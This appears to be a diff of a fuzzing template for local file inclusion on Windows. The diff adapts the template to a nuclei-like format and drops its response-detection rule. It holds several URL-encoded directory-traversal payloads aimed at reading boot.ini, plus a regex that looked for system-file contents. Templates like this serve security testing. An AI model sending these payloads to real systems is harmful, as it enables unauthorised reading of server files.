@@ -1,9 +1,9 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: lfi-01
-type: fuzz
-level: 2
 info:
   name: LFI on Path Windows
-  risk: High
+  author: unknown
+  severity: info
 
 variables:
   - head: |
@@ -125,9 +125,6 @@ payloads:
     - '%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini'
     - '%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini'
 
-requests:
+http:
   - generators:
       - Header("{{.payload}}", "{{.head}}")
-    detections:
-      - >-
-        StatusCode() == 200 && RegexSearch("response", "root:|for 16-bit app support|boot loader")
